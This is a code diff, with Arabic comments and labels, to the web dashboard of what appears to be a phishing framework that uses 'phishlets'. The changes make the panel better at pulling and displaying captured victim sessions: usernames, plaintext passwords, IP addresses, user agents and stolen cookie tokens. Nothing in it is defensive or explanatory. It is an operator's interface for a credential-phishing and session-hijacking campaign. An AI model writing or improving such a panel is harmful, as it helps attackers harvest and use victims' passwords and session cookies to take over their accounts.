@@ -562,7 +562,15 @@ async function fetchSessionDetails(id) {
             };
         }
         
-        return await response.json();
+        const responseJson = await response.json();
+        console.log('استجابة تفاصيل الجلسة:', responseJson);
+        
+        // استخراج البيانات من حقل Data في الاستجابة
+        if (responseJson.success && responseJson.data) {
+            return responseJson.data;
+        }
+        
+        return null;
     } catch (error) {
         handleApiError(error);
         return null;
@@ -661,11 +669,18 @@ function populateRecentSessionsTable(tableElement, sessions) {
     
     sessions.forEach(session => {
         // التأكد من وجود كافة البيانات الضرورية
-        const sessionId = session.id || session.session_id || session.SessionId || '';
-        const phishlet = session.phishlet || '';
-        const username = session.username || session.user || session.login || 'غير مسجل';
-        const ip = session.remote_addr || session.ip || session.remote_ip || '';
-        const created = session.created || session.timestamp || session.time || '';
+        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
+        const phishlet = session.phishlet || session.Phishlet || '';
+        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
+        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
+        
+        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
+        let created = null;
+        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
+        else if (session.CreateTime) created = session.CreateTime * 1000;
+        else if (session.created) created = session.created;
+        else if (session.timestamp) created = session.timestamp;
+        else if (session.time) created = session.time;
         
         const tr = document.createElement('tr');
         tr.innerHTML = `
@@ -863,15 +878,29 @@ function populateSessionsTable(sessions) {
     console.log('بيانات الجلسات الكاملة:', sessions);
     
     sessions.forEach(session => {
-        // التأكد من وجود كافة البيانات الضرورية
-        const sessionId = session.id || session.session_id || session.SessionId || '';
-        const phishlet = session.phishlet || '';
-        const username = session.username || session.user || session.login || 'غير مسجل';
-        const password = session.password || session.pass || 'غير مسجل';
-        const ip = session.remote_addr || session.ip || session.remote_ip || '';
-        const created = session.created || session.timestamp || session.time || '';
-        const hasCredentials = (session.tokens && Object.keys(session.tokens).length > 0) || 
-                            username !== 'غير مسجل' || password !== 'غير مسجل';
+        // التأكد من وجود كافة البيانات الضرورية باستخدام جميع المسميات المحتملة
+        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
+        const phishlet = session.phishlet || session.Phishlet || '';
+        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
+        const password = session.password || session.Password || session.pass || session.Pass || 'غير مسجلة';
+        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
+        
+        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
+        let created = null;
+        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
+        else if (session.CreateTime) created = session.CreateTime * 1000;
+        else if (session.created) created = session.created;
+        else if (session.timestamp) created = session.timestamp;
+        else if (session.time) created = session.time;
+        
+        // التحقق من وجود رموز أو بيانات اعتماد
+        const hasCredentials = (
+            (session.tokens && Object.keys(session.tokens).length > 0) || 
+            (session.Tokens && Object.keys(session.Tokens).length > 0) ||
+            (session.CookieTokens && Object.keys(session.CookieTokens).length > 0) ||
+            username !== 'غير مسجل' || 
+            password !== 'غير مسجلة'
+        );
         
         const tr = document.createElement('tr');
         tr.innerHTML = `
@@ -946,45 +975,64 @@ async function showSessionDetails(id) {
         const loadingSpinner = modal.querySelector('.loading-spinner');
         loadingSpinner.style.display = 'none';
         
+        console.log('تفاصيل الجلسة بعد الاستخراج:', sessionDetails);
+        
         if (!sessionDetails) {
             showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
             return;
         }
         
+        // تحضير البيانات مع التحقق من وجودها
+        const sessionId = sessionDetails.id || sessionDetails.session_id || sessionDetails.SessionId || 'غير معروف';
+        const phishlet = sessionDetails.phishlet || 'غير معروف';
+        const username = sessionDetails.username || sessionDetails.user || sessionDetails.login || 'غير مسجل';
+        const password = sessionDetails.password || sessionDetails.pass || 'غير مسجلة';
+        const ip = sessionDetails.remote_addr || sessionDetails.ip || sessionDetails.remote_ip || 'غير معروف';
+        const userAgent = sessionDetails.user_agent || sessionDetails.useragent || sessionDetails.UserAgent || 'غير متوفر';
+        const created = sessionDetails.created || sessionDetails.timestamp || sessionDetails.time || null;
+        
         // عرض معلومات الجلسة
         const sessionInfoElement = modal.querySelector('.session-info');
         sessionInfoElement.innerHTML = `
             <div class="info-item">
-                <span class="info-label">معرف الجلسة</span>
-                <span class="info-value">${sessionDetails.id}</span>
+                <span class="info-label">معرف الجلسة:</span>
+                <span class="info-value">${sessionId}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">Phishlet</span>
-                <span class="info-value">${sessionDetails.phishlet}</span>
+                <span class="info-label">Phishlet:</span>
+                <span class="info-value">${phishlet}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">اسم المستخدم</span>
-                <span class="info-value">${sessionDetails.username || 'غير مسجل'}</span>
+                <span class="info-label">اسم المستخدم:</span>
+                <span class="info-value">${username}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">الكلمة السرية</span>
-                <span class="info-value">${sessionDetails.password || 'غير مسجلة'}</span>
+                <span class="info-label">كلمة المرور:</span>
+                <span class="info-value">${password}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">عنوان IP</span>
-                <span class="info-value">${sessionDetails.remote_addr}</span>
+                <span class="info-label">عنوان IP:</span>
+                <span class="info-value">${ip}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">تاريخ الإنشاء</span>
-                <span class="info-value">${formatDate(sessionDetails.created)}</span>
+                <span class="info-label">وكيل المستخدم:</span>
+                <span class="info-value">${userAgent}</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">تاريخ الإنشاء:</span>
+                <span class="info-value">${formatDate(created)}</span>
             </div>
         `;
         
         // عرض الرموز والبيانات
         const tokensContainer = modal.querySelector('.tokens-container');
-        if (sessionDetails.tokens && Object.keys(sessionDetails.tokens).length > 0) {
+        
+        // التحقق من وجود الرموز - قد تكون في أي من هذه الحقول حسب هيكل البيانات
+        const tokens = sessionDetails.tokens || sessionDetails.Tokens || sessionDetails.cookies || {};
+        
+        if (tokens && Object.keys(tokens).length > 0) {
             let tokensHTML = '';
-            for (const [key, value] of Object.entries(sessionDetails.tokens)) {
+            for (const [key, value] of Object.entries(tokens)) {
                 tokensHTML += `
                     <div class="token-item">
                         <div class="token-name">${key}</div>
@@ -998,7 +1046,7 @@ async function showSessionDetails(id) {
         }
         
     } catch (error) {
-        console.error('Error fetching session details:', error);
+        console.error('خطأ في جلب تفاصيل الجلسة:', error);
         showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
     }
 }
